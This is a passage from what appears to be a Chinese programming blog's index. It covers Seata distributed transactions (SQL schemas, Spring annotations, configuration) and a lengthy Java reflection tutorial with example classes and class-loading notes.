(`xid`,`branch_id`) ) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8; CREATE DATABASE IF NOT EXISTS `order_db`; USE `order_db`; DROP TABLE IF EXISTS `order_tbl`; CREATE TABLE `order_tbl` ( `id` int(11) NOT NULL AUTO_INCREMENT, `user_id` varchar(255) DEFAULT NULL, `commodity_code` varchar(255) DEFAULT NULL, `count` int(11) DEFAULT 0, `money` int(11) DEFAULT 0, PRIMARY KEY (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8; -- 注意此处0.3.0+ 增加唯一索引 ux_undo_log DROP TABLE IF EXISTS `undo_log`; CREATE TABLE `undo_log` ( `id` bigint(20) NOT NULL AUTO_INCREMENT, `branch_id` bigint(20) NOT NULL, `xid` varchar(100) NOT NULL, `context` varchar(128) NOT NULL, `rollback_info` longblob NOT NULL, `log_status` int(11) NOT NULL, `log_created` datetime NOT NULL, `log_modified` datetime NOT NULL, `ext` varchar(100) DEFAULT NULL, PRIMARY KEY (`id`), UNIQUE KEY `ux_undo_log` (`xid`,`branch_id`) ) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8; CREATE DATABASE IF NOT EXISTS `account_db`; USE `account_db`; DROP TABLE IF EXISTS `account_tbl`; CREATE TABLE `account_tbl` ( `id` int(11) NOT NULL AUTO_INCREMENT, `user_id` varchar(255) DEFAULT NULL, `money` int(11) DEFAULT 0, PRIMARY KEY (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8; INSERT INTO account_tbl (user_id, money) VALUES (\u0026#39;1\u0026#39;, 10000); -- 注意此处0.3.0+ 增加唯一索引 ux_undo_log DROP TABLE IF EXISTS `undo_log`; CREATE TABLE `undo_log` ( `id` bigint(20) NOT NULL AUTO_INCREMENT, `branch_id` bigint(20) NOT NULL, `xid` varchar(100) NOT NULL, `context` varchar(128) NOT NULL, `rollback_info` longblob NOT NULL, `log_status` int(11) NOT NULL, `log_created` datetime NOT NULL, `log_modified` datetime NOT NULL, `ext` varchar(100) DEFAULT NULL, PRIMARY KEY (`id`), UNIQUE KEY `ux_undo_log` (`xid`,`branch_id`) ) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8; ApiPost接口测试 Apipost-API 文档、设计、调试、自动化测试一体化协作平台\n根据代码逻辑创建对应接口\n本地事务测试 @Transactional注解是 Spring 提供的声明式事务管理注解，用于标记方法或类，使其在方法执行期间自动管理事务（开启、提交或回滚）。\n使用@Transactional注解时需要在自己的启动类上添加@EnableTransactionManagement注解才能正常使用\n1 2 3 4 5 6 7 8 @Transactional 本地事务 //当使用Transactional注解时，如果count=5那么会自动回滚事务 @Override public void deduct(String commodityCode, int count) { storageTblMapper.deduct(commodityCode, count); if (count == 5) { throw new RuntimeException(\u0026#34;库存不足\u0026#34;); } } 打通远程调用 使用OpenFeign远程调用对应的微服务\n采购business需要远程调用库存服务和订单服务，那么在采购模块中创建OpenFeign\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 @Service public class BusinessServiceImpl implements BusinessService { @Autowired StorageFeignClient storageFeignClient; @Autowired OrderFeignClient orderFeignClient; @GlobalTransactional @Override public void purchase(String userId, String commodityCode, int orderCount) { //1. 扣减库存 storageFeignClient.deduct(commodityCode, orderCount); //2. 创建订单 orderFeignClient.create(userId, commodityCode, orderCount); } } 引入Seata解决分布式事务 下载Seata服务 Seata Java Download | Apache Seata\n1 2 3 4 seata-server.bat //直接运行即可 http://127.0.0.1:7091/#/login //Web界面地址 默认账户密码：seata/seata http://127.0.0.1:8091 //监听地址 项目文件中引入Seata依赖\n1 2 3 4 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-alibaba-seata\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 在每个项目的配置文件中创建一个名为file.conf的文件，内容如下\n1 2 3 4 5 6 7 8 9 10 service { #transaction service group mapping vgroupMapping.default_tx_group = \u0026#34;default\u0026#34; #only support when registry.type=file, please don\u0026#39;t set multiple addresses default.grouplist = \u0026#34;127.0.0.1:8091\u0026#34; #degrade, current not support enableDegrade = false #disable seata disableGlobalTransaction = false } 使用Seata 使用Seata需要在最开始的请求地方加上@GlobalTransactional注解\n@GlobalTransactional 是 Seata 提供的一个注解，用于声明一个方法或类需要进行 全局事务管理。它是 Seata 分布式事务解决方案的核心注解之一，用于确保跨多个微服务或数据库的操作要么全部成功，要么全部回滚。\n1 2 3 4 5 6 7 8 9 @GlobalTransactional @Override public void purchase(String userId, String commodityCode, int orderCount) { //1. 扣减库存 storageFeignClient.deduct(commodityCode, orderCount); //2. 创建订单 orderFeignClient.create(userId, commodityCode, orderCount); } Seata原理 二阶提交协议 二阶提交协议：事务提交分为两个阶段，第一阶段是本地事务提交，包含（业务修改数据的提交和undo_log日志的提交）。第二阶段只有两个步骤（成功提交和失败回滚），如果成功提交，所以人删除undo_log日志。如果提交失败，所有人拿到自己的前镜像，恢复数据，删除undo_log\n四种事务模式 Seata AT 模式 | Apache Seata\n默认使用AT模式，如果想使用其它模式，可以在配置文件中添加\n1 2 seata: data-source-proxy-mode: XA ","date":"2025-06-10T14:11:55+08:00","image":"https://lserein.github.io/p/seata/Seata_hu_3e17fd9a8bb95161.png","permalink":"https://lserein.github.io/p/seata/","title":"Seata"},{"content":"1.Java反射专题 反射机制允许程序在执行期借助于Reflection API取得任何类的内部信息（比如成员变量，构造器，成员方法等等)，并能操作对像的属性及方法。反射在设计模式和框架底层都会用到。反射面前一切都是纸老虎\n1.1.反射是什么\u0026mdash;一个需求引出反射 1 2 3 根据配置文件re.properties内容，创建Cat对象并调用hi方法 classfullpath=com.edu.Cat method=hi 开闭原则（ocp原则）：不修改源码，来扩展功能\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 public class Question { public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException { //根据配置文件re.properties内容，创建Cat对象并调用hi方法 //使用之前学的无法解决，只能使用反射进行解决 //使用Properties类读取配置文件 Properties properties = new Properties(); properties.load(new FileInputStream(\u0026#34;src\\\\re.properties\u0026#34;)); String classfullpath = properties.get(\u0026#34;classfullpath\u0026#34;).toString(); String methodName = properties.get(\u0026#34;method\u0026#34;).toString(); System.out.println(classfullpath); System.out.println(methodName); //1.加载类,返回class类型的对象cls Class cls = Class.forName(classfullpath); //2.通过cls得到你加载类的对象示例 Object object = cls.newInstance(); System.out.println(\u0026#34;object对象的运行类型\u0026#34;+object.getClass()); //运行类型 //3.通过cls得到你加载的类com.edu.Cat的methodName \u0026#34;hi\u0026#34;对象 //即：在反射中，可以把方法视为对象，万物皆对象 Method method1 = cls.getMethod(methodName); //通过method1调用方法invode method1.invoke(object); } } 1.2.反射原理图 这张图片展示了Java程序的三个主要阶段：代码阶段/编译阶段、Class类阶段（加载阶段）和Runtime运行阶段。\n1 2 3 在这个阶段，开发者编写Java源代码文件，例如Cat.java。 代码中定义了类Cat，包括私有字符串变量name、公共构造函数Cat()和公共方法hi()。 通过Java编译器，源代码被编译成字节码文件Cat.class。 1 2 3 在这个阶段，类加载器（ClassLoader）将字节码文件Cat.class加载到内存中。 加载后，形成了Class对象，包含了类的元数据，如成员变量（Field）、构造器（Constructor）和成员方法（Method）。 这些元数据存储在堆内存中，供后续的运行时使用。 1 2 3 4 5 6 在运行时阶段，Java虚拟机（JVM）执行字节码。 通过new Cat()创建Cat类的实例对象cat。 该对象知道它属于哪个Class对象，并且可以通过该Class对象访问其元数据。 得到Class对象后，可以进行以下操作： 创建对象，调用构造函数。 操作对象的属性和方法。 1.3.反射机制 1.3.1.java.lang.reflect.Field\u0026mdash;获取某个类的字段 ** java.lang.reflect.Field:代表类的成员变量，Field类表示某个类的成员变量**\n获取某个类的字段\ngetField不能获取private修饰的私有属性\ngetDeclaredField可用来获取私有属性\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 package com.edu.reflection; import java.io.FileInputStream; import java.io.FileNotFoundException; import java.io.IOException; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import java.util.Properties; public class Reflection1 { public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, NoSuchFieldException { //使用Properties类读取配置文件 Properties properties = new Properties(); properties.load(new FileInputStream(\u0026#34;src\\\\re.properties\u0026#34;)); String classfullpath = properties.get(\u0026#34;classfullpath\u0026#34;).toString(); String methodName = properties.get(\u0026#34;method\u0026#34;).toString(); //1.加载类,返回class类型的对象cls Class cls = Class.forName(classfullpath); //2.通过cls得到你加载类的对象示例 Object object = cls.newInstance(); System.out.println(\u0026#34;object对象的运行类型\u0026#34;+object.getClass()); //运行类型 //3.通过cls得到你加载的类com.edu.Cat的methodName \u0026#34;hi\u0026#34;对象 //即：在反射中，可以把方法视为对象，万物皆对象 Method method1 = cls.getMethod(methodName); //通过method1调用方法invode method1.invoke(object); //java.lang.reflect.Field:代表类的成员变量，Field类表示某个类的成员变量 //获取某个类的字段 // getField不能获取私有的属性 Field name = cls.getField(\u0026#34;age\u0026#34;); System.out.println(name.get(object)); //10 //getDeclaredField可用来获取私有属性 Field name1 = cls.getDeclaredField(\u0026#34;name\u0026#34;); name1.setAccessible(true); System.out.println(name1.get(object)); } } 1.3.2.java.lang.reflect.Constructor：获取构造器 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 java.lang.reflect.Constructor：代表类的构造方法，Constructor表示构造器 //1.加载类,返回class类型的对象cls Class cls = Class.forName(classfullpath); //2.通过cls得到你加载类的对象示例 Object object = cls.newInstance(); System.out.println(\u0026#34;object对象的运行类型\u0026#34;+object.getClass()); //运行类型 //3.通过cls得到你加载的类com.edu.Cat的methodName \u0026#34;hi\u0026#34;对象 //即：在反射中，可以把方法视为对象，万物皆对象 Method method1 = cls.getMethod(methodName); //通过method1调用方法invode method1.invoke(object); //java.lang.reflect.Constructor：代表类的构造方法，Constructor表示构造器 //获取无参构造器 Constructor constructor = cls.getConstructor(); System.out.println(constructor); //获取有参构造器 Constructor constructor1 = cls.getConstructor(String.class); //这里的String.class就是String类的Class对象 System.out.println(constructor1); 1.4.反射的优点与缺点 优点：可以动态的创建和使用对象（也是框架底层核心），使用灵活，没有反射机制，框架技术就失去底层支撑。\n缺点：使用反射是基于解释执行，对执行速度有影响\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 public class Reflection2 { public static void main(String[] args) throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException { m1(); m2(); m3(); } //使用传统方法创建Cat对象耗时 public static void m1(){ long start = System.currentTimeMillis(); for (int i = 0;i\u0026lt;1000000;i++){ Cat cat = new Cat(); } long end = System.currentTimeMillis(); System.out.println(\u0026#34;传统方法耗时：\u0026#34;+(end-start)); } public static void m2() throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException { long start = System.currentTimeMillis(); Class\u0026lt;?\u0026gt; cls = Class.forName(\u0026#34;com.edu.Cat\u0026#34;); Object o = cls.newInstance(); Method hi = cls.getMethod(\u0026#34;hi\u0026#34;); for (int i = 0;i\u0026lt;1000000;i++){ hi.invoke(o); } long end = System.currentTimeMillis(); System.out.println(\u0026#34;反射方法耗时：\u0026#34;+(end-start)); } public static void m3() throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException { long start = System.currentTimeMillis(); Class\u0026lt;?\u0026gt; cls = Class.forName(\u0026#34;com.edu.Cat\u0026#34;); Object o = cls.newInstance(); Method hi = cls.getMethod(\u0026#34;hi\u0026#34;); hi.setAccessible(true); for (int i = 0;i\u0026lt;1000000;i++){ hi.invoke(o); } long end = System.currentTimeMillis(); System.out.println(\u0026#34;反射方法耗时：\u0026#34;+(end-start)); } } 1.5.通过反射获取类的结构信息 //getName：获取全类名\n//getSimpleName:获取简单类名\n//getFields:获取所有public修饰的属性，包括本类以及父类的\n//getDeclaredFields:获取本类中所有属性\n//getMethods:获取所有public修饰的方法，包含本类以及父类\n//getDeclaredMethods:获取本类中所有方法\n//getConstructors:获取public修饰的构造器，只包含本类不包含父类\n//getDeclaredConstructors:获取本类中所有构造器\n//getPackage:以package形式返回包信息\n//getSuperclass:以class形式返回父类信息\n//getInterfaces:以Class形式返回接口信息\n//getAnnotations:以Annotation[]形式返回注解信息\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 package com.edu.reflection; import org.junit.Test; import java.lang.annotation.Annotation; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.Method; /* * 演示如何通过反射获取类的结构信息 * */ public class ReflectionUtils { public static void main(String[] args) { } //第一组方法API @Test public void api01() throws ClassNotFoundException { //得到class对象 Class\u0026lt;?\u0026gt; cls = Class.forName(\u0026#34;com.edu.reflection.Person\u0026#34;); //getName：获取全类名 System.out.println(cls.getName()); //com.edu.reflection.Person //getSimpleName:获取简单类名 System.out.println(cls.getSimpleName());//Person //getFields:获取所有public修饰的属性，包括本类以及父类的 Field[] fields = cls.getFields(); for (Field field : fields) { System.out.println(field.getName()); //hobby,name } //getDeclaredFields:获取本类中所有属性 Field[] declaredFields = cls.getDeclaredFields(); for (Field declaredField : declaredFields) { System.out.println(declaredField.getName()); //name,age,job,sal } //getMethods:获取所有public修饰的方法，包含本类以及父类 Method[] methods = cls.getMethods(); for (Method method : methods) { System.out.println(method.getName()); } //getDeclaredMethods:获取本类中所有方法 Method[] declaredMethods = cls.getDeclaredMethods(); for (Method declaredMethod : declaredMethods) { System.out.println(declaredMethod.getName()); } //getConstructors:获取public修饰的构造器，只包含本类 Constructor\u0026lt;?\u0026gt;[] constructors = cls.getConstructors(); //getDeclaredConstructors:获取本类中所有构造器 Constructor\u0026lt;?\u0026gt;[] declaredConstructors = cls.getDeclaredConstructors(); //getPackage:以package形式返回包信息 System.out.println(cls.getPackage()); //com.edu.reflection //getSuperclass:以class形式返回父类信息 Class\u0026lt;?\u0026gt; superclass = cls.getSuperclass(); System.out.println(superclass); //com.edu.reflection.A //getInterfaces:以Class形式返回接口信息 Class\u0026lt;?\u0026gt;[] interfaces = cls.getInterfaces(); for (Class\u0026lt;?\u0026gt; anInterface : interfaces) { System.out.println(anInterface.getName()); } //getAnnotations:以Annotation[]形式返回注解信息 Annotation[] annotations = cls.getAnnotations(); System.out.println(annotations); //Deprecated } } class A{ public String hobby; public void hi(){} } interface IA{ } interface IB{ } @Deprecated class Person extends A implements IA,IB{ //四种不同访问权限的属性 public String name; protected int age; String job; private double sal; public void m1(){} protected void m2(){} void m3(){} private void m4(){} } //getModifiers：以int形式返回修饰符，默认修饰符是0，public是1，private是2，protected是4，static是8，final是16\n如果有属性是punlic(1) static(8) = 9 修饰，那么他的结果是相加\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 public void api02() throws ClassNotFoundException{ //得到class对象 Class\u0026lt;?\u0026gt; cls = Class.forName(\u0026#34;com.edu.reflection.Person\u0026#34;); //getDeclaredFields:获取本类中所有属性 Field[] declaredFields = cls.getDeclaredFields(); for (Field declaredField : declaredFields) { System.out.println(declaredField.getName()); //name,age,job,sal System.out.println(\u0026#34;该属性的修饰符值=\u0026#34;+declaredField.getModifiers()); System.out.println(\u0026#34;该属性对应的类型\u0026#34;+declaredField.getType()); //class java.lang.String } //getDeclaredMethods:获取本类中所有方法 Method[] declaredMethods = cls.getDeclaredMethods(); for (Method declaredMethod : declaredMethods) { System.out.println(\u0026#34;本类中所有方法：\u0026#34;+declaredMethod.getName()); System.out.println(\u0026#34;本类中方法所对应修饰符的值\u0026#34;+declaredMethod.getModifiers()); System.out.println(\u0026#34;该方法返回类型\u0026#34;+declaredMethod.getReturnType()); //void //输出当前这个方法的形参数组情况 Class\u0026lt;?\u0026gt;[] parameterTypes = declaredMethod.getParameterTypes(); for (Class\u0026lt;?\u0026gt; parameterType : parameterTypes) { System.out.println(\u0026#34;该方法的形参类型\u0026#34;+parameterType); } } } 1.6.通过反射爆破创建对象实例 方法1：调用类中的public修饰的无参构造器\n方法2：调用类中的指定构造器\nClass类相关方法：\n1 2 3 newInstance：调用类中的无参构造器，获取对应类的对象 getConstructor(Class...clazz)：根据参数列表，获取对应的public构造器对象 getDecalaredConstructor(Class...clazz):根据参数列表，获取对应的所有构造器对象 Constructor类相关方法：\n1 2 setAccessible：爆破 newInstance(Object...obj):调用构造器 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 package com.edu; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationTargetException; /* * 演示通过反射机制创建实例 * */ public class CreateInstance { public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException { //1.先获取User类的Class对象 Class\u0026lt;?\u0026gt; Userclass = Class.forName(\u0026#34;com.edu.User\u0026#34;); //2.通过public的无参构造器创建实例 Object o = Userclass.newInstance(); System.out.println(o); //姓名为张三*******年龄为13 //3.通过public的有参构造器创建实例 //此时此刻，这个constructor对象就是下面这个构造器 /* * public User(String name){ //public有参构造器 this.name = name; */ //3.1.先得到对应的构造器,getConstructor返回public的构造器 Constructor\u0026lt;?\u0026gt; constructor = Userclass.getConstructor(String.class); //3.2.创建实例，并传入实参 Object lisi = constructor.newInstance(\u0026#34;lisi\u0026#34;); System.out.println(lisi); //姓名为lisi*******年龄为13 //4.通过非public的有参构造器创建实例---私有 Constructor\u0026lt;?\u0026gt; declaredConstructor = Userclass.getDeclaredConstructor(int.class, String.class); declaredConstructor.setAccessible(true); //爆破，使用反射可以访问私有的private构造器 Object o1 = declaredConstructor.newInstance(18,\u0026#34;wangwu\u0026#34;); System.out.println(o1); } } class User{ private int age = 13; private String name = \u0026#34;张三\u0026#34;; public User(){} //无参 public public User(String name){ //public有参构造器 this.name = name; } private User(int age,String name){ //有参 私有 this.age = age; this.name = name; } @Override public String toString() { return \u0026#34;姓名为\u0026#34;+name+\u0026#34;*******年龄为\u0026#34;+age; } } 1.7.通过反射爆破操作属性 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 package com.edu; import java.lang.reflect.Field; /* * 演示反射访问操作属性 * */ public class ReflectAccess { public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchFieldException { //1.得到Student类对应的class对象 Class\u0026lt;?\u0026gt; StuClass = Class.forName(\u0026#34;com.edu.Student\u0026#34;); //2.创建一个对象 Object o = StuClass.newInstance(); //o的运行类型为Student //3.使用反射得到age属性对象 Field age = StuClass.getField(\u0026#34;age\u0026#34;); //通过反射操作age属性 age.set(o,18); //反射操作name属性，name属性私有且静态 Field name = StuClass.getDeclaredField(\u0026#34;name\u0026#34;); //对name进行爆破 name.setAccessible(true); //name.set(o,\u0026#34;张三\u0026#34;); name.set(null,\u0026#34;张三\u0026#34;); //因为name有static属性，所以o也可以写成null System.out.println(o); } } class Student{ public int age; private static String name; public Student(){ } @Override public String toString() { return \u0026#34;Student{\u0026#34; + \u0026#34;age=\u0026#34; + age + \u0026#34;.......\u0026#34; + \u0026#34;name\u0026#34; + name + \u0026#39;}\u0026#39;; } } 1.8.通过反射爆破操作方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 package com.edu; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; /* * 演示反射调用方法 * */ public class ReflectAccessMethod { public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException { //1.得到Boss类对应的class对象 Class\u0026lt;?\u0026gt; cls = Class.forName(\u0026#34;com.edu.Boss\u0026#34;); //2.创建对象 Object o = cls.newInstance(); //3.得到hi方法对象 Method hi = cls.getMethod(\u0026#34;hi\u0026#34;,String.class); //4.调用方法 Object invoke = hi.invoke(o,\u0026#34;666\u0026#34;); Method say = cls.getDeclaredMethod(\u0026#34;say\u0026#34;, int.class, String.class, char.class); say.setAccessible(true); Object invoke1 = say.invoke(o, 100, \u0026#34;张三\u0026#34;, \u0026#39;男\u0026#39;); System.out.println(invoke1); //因为say方法是静态的，所以对象位置可以使用null代替 System.out.println(say.invoke(null, 99, \u0026#34;小红\u0026#34;, \u0026#39;女\u0026#39;)); //5.在反射中，如果方法有返回值，统一返回object } } class Boss{ public int age; private static String name; public Boss(){} private static String say(int n,String s,char c){ return n + \u0026#34;\u0026#34; + s + \u0026#34;\u0026#34; + c; } public void hi(String s){ System.out.println(\u0026#34;hi\u0026#34;+s); } } 1.9.小练习 利用反射和File完成以下功能\n1.利用Class类的forName方法得到File类的class对象\n2.在控制台打印File类的所有构造器\n3.通过newInstance的方法创建File对象，并创建mynew.txt文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 package com.edu.homework; import java.io.File; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; /* * */ public class homework2 { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException { //1.利用Class类的forName方法得到File类的class对象 Class\u0026lt;?\u0026gt; cls = Class.forName(\u0026#34;java.io.File\u0026#34;); //2.得到所有构造器 Constructor\u0026lt;?\u0026gt;[] declaredConstructors = cls.getDeclaredConstructors(); for (Constructor\u0026lt;?\u0026gt; declaredConstructor : declaredConstructors) { System.out.println(\u0026#34;File的构造器\u0026#34;+declaredConstructor); } //3.通过指定构造器创建文件file对象 Constructor\u0026lt;?\u0026gt; declaredConstructor = cls.getDeclaredConstructor(String.class); String filepath = \u0026#34;E:\\\\mynew.txt\u0026#34;; Object fileobject = declaredConstructor.newInstance(filepath); //创建file对象，运行类型就是File //4.得到createNewFile的方法对象 Method createNewFile = cls.getMethod(\u0026#34;createNewFile\u0026#34;); createNewFile.invoke(fileobject); //创建文件，调用createNewFile // System.out.println(fileobject.getClass()); System.out.println(\u0026#34;创建文件成功：\u0026#34;+filepath); } } 2.Class类 1 2 3 4 5 6 7 8 1.Class也是类，因此也继承object类[类图] 2.Class类对象不是new出来的，而是系统创建的 3.对于某个类的Class类对象，在内存中只有一份，因为类只加载一次 4.每个类的实例都会记得自己是由哪个Class实例所生成 5.通过Class可以完整地得到一个类的完整结构,通过一系列API 6.Class对象是存放在堆的 7.类的字节码二进制数据，是放在方法区的，有的地方称为类的元数据（包括方法代码， 变量名，方法名，访问权限等等) https://www.zhihu.com/question/38496907\n1 2 3 4 5 //3.对于某个类的Class类对象，在内存中只有一份，因为类只加载一次 Class\u0026lt;?\u0026gt; cls1 = Class.forName(\u0026#34;com.edu.Cat\u0026#34;); Class\u0026lt;?\u0026gt; cls2 = Class.forName(\u0026#34;com.edu.Cat\u0026#34;); System.out.println(cls1.hashCode()); System.out.println(cls2.hashCode()); 2.1.Class类常用方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 package com.edu.Class; import com.edu.Car; import java.lang.reflect.Field; public class class2 { public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchFieldException { String classPath = \u0026#34;com.edu.Car\u0026#34;; //1.获取Car类对应的Class对象 //\u0026lt;?\u0026gt;表示不确定的Java类型 Class\u0026lt;?\u0026gt; cls = Class.forName(classPath); System.out.println(cls); //显示cls对象，是哪个类的Class对象 com.edu.Car System.out.println(cls.getClass()); //输出cls的运行类型 java.lang.Class //2.得到包名 ---- getPackage().getName() System.out.println(cls.getPackage().getName()); //com.edu //3.得到全类名 ----- getName() System.out.println(cls.getName()); //com.edu.Car //4.通过cls创建对象实例 ----newInstance() Car car = (Car)cls.newInstance(); System.out.println(car); //Car{brand=\u0026#39;宝马\u0026#39;, price=19999999, color=\u0026#39;红色\u0026#39;} //5.通过反射获取属性 ---getField Field field = cls.getField(\u0026#34;brand\u0026#34;); System.out.println(field.get(car)); //宝马 //6.通过反射修改属性 -------field.set(car,\u0026#34;奔驰\u0026#34;); field.set(car,\u0026#34;奔驰\u0026#34;); System.out.println(field.get(car)); //奔驰 //7.我希望获取到所有属性 --------cls.getFields() Field[] fields = cls.getFields(); for (Field field1 : fields) { System.out.println(field1.getName()); //brand price color } } } 2.2.获取Class对象的六种方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 /* * 获取class对象的各种方式 * */ public class GetClass { public static void main(String[] args) throws ClassNotFoundException { //1.已知一个类的全类名，且在类的类路径下，可通过Class的静态方法forname()获取 //应用场景：多用于配置文件，读取全路径加载类 Class\u0026lt;?\u0026gt; cls1 = Class.forName(\u0026#34;com.edu.Car\u0026#34;); System.out.println(cls1); //2.若知道具体类，通过类的class获取，该方式是最安全可靠，程序性能最高实例 //应用场景：多用于参数传递，比如通过反射得到对应构造器对象 Class\u0026lt;Car\u0026gt; cls2 = Car.class; System.out.println(cls2); //3.已知某个类的实例，调用该实例的getClass()方法获取Class对象 //应用场景：通过创建好的对象，获取Class对象 Car car = new Car(); Class\u0026lt;? extends Car\u0026gt; cls3 = car.getClass(); System.out.println(cls3); //4.通过类加载器【有4种类加载器】获取到类的Class对象 //(1)先获取类加载器 Car ClassLoader classLoader = car.getClass().getClassLoader(); //(2)通过类加载器得到class对象 Class\u0026lt;?\u0026gt; cls4 = classLoader.loadClass(\u0026#34;com.edu.Car\u0026#34;); System.out.println(cls4); //cls1 cls2 cls3 cls4其实是同一个对象 System.out.println(cls1.hashCode()); System.out.println(cls2.hashCode()); System.out.println(cls3.hashCode()); System.out.println(cls4.hashCode()); //5.基本数据类型(int,char,boolean,float,double,byte,long,short) //获取Class对象 Class cls5 = long.class; System.out.println(cls5); //6.基本数据类型对应的包装类，可通过.type得到Class类对象 Class cls6 = Integer.TYPE; System.out.println(cls6); } } 2.3.哪些类型有Class对象 1.外部类，成员内部类，静态内部类，局部内部类，匿名内部类\n2.interface 接口\n3.数组\n4.enum 枚举类型\n5.annotation：注解\n6.基本数据类型\n7.Void\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 package com.edu.Class; import java.io.Serializable; public class AlltypeClass { public static void main(String[] args) { Class\u0026lt;String\u0026gt; cls1 = String.class; //外部类 Class\u0026lt;Serializable\u0026gt; cls2 = Serializable.class; //接口 Class\u0026lt;Integer[]\u0026gt; cls3 = Integer[].class; //数组 Class\u0026lt;float[][]\u0026gt; cls4 = float[][].class; //二维数组 Class\u0026lt;Deprecated\u0026gt; cls5 = Deprecated.class; //注解 Class\u0026lt;Thread.State\u0026gt; cls6 = Thread.State.class; //枚举 Class\u0026lt;Long\u0026gt; cls7 = long.class; //基本数据类型 Class\u0026lt;Void\u0026gt; cls8 = void.class; //void类型 Class\u0026lt;Class\u0026gt; cls9 = Class.class; // } } 3.类加载 3.1.动态加载与静态加载 静态加载：编译时加载相关类，如果没用则报错，依赖性太强\n动态加载：运行时加载需要的类，如果运行时不用该类，则不报错，降低了依赖性\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 public class Classload1 { public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException { Scanner sc = new Scanner(System.in); System.out.println(\u0026#34;请输入key\u0026#34;); String key = sc.next(); switch (key){ case \u0026#34;1\u0026#34; : Dog dog = new Dog(); //静态加载，编译时直接报错，依赖性强 dog.cry(); break; case \u0026#34;2\u0026#34;: //反射---\u0026gt;动态加载 Class\u0026lt;?\u0026gt; cls = Class.forName(\u0026#34;Dog\u0026#34;); //动态加载，编译时可通过，运行时没用该类才会报错 Object o = cls.newInstance(); Method method = cls.getMethod(\u0026#34;h1\u0026#34;); method.invoke(o); break; default: System.out.println(\u0026#34;do nothing....\u0026#34;); } } } 3.2.类加载流程图 类加载每个阶段需要干的事\n3.3.类加载5个阶段 3.3.1.加载阶段 JVM在该阶段的主要目的是将字节码从不同的数据源（可能是class文件、也可能是jar包，甚至网络)转化为二进制字节流加载到内存中，并生成一个代表该类的java.lang.Class对象\n3.3.2.连接阶段 验证阶段 目的是确保当前Class文件的字节流中包含的信息符合当前虚拟机的要求，并且不会危害虚拟机自身安全\n包括：文件格式验证（是否以魔数 0xcafebabe开头）,元数据验证，字节码验证和符号引用验证\n可以考虑使用-X verify:none参数来关闭大部分类验证措施，缩短虚拟机类加载的时间\n准备阶段 1 2 3 4 5 6 7 8 class A{ //1.n1是实例变量，不是静态变量，因此在准备阶段，是不会分配内存的 //2.n2是静态变量，准备阶段需要分配内存，n2的默认值为0，而不是20，20是在初始化阶段进行赋值的 